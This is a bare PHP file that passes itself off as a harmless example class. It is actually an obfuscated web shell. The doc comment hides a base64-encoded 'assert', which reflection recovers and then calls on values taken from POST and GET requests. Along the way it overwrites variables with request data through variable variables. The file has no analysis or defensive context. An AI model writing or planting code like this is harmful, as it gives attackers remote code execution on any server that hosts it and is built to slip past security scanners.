<?php

/**
* YXNzZXJ0YWE=
*/
class Example
{
    public function fn()
    {
    }
}

$reflector = new ReflectionClass('Example');

$zhushi = substr(($reflector->getDocComment()), 7, 12);
$zhushi = base64_decode($zhushi);
$zhushi = substr($zhushi, 0, 6);
//
foreach (array('_POST','_GET') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key=  $_value;
        print_r($$_request);
    }
}
$zhushi($_value);
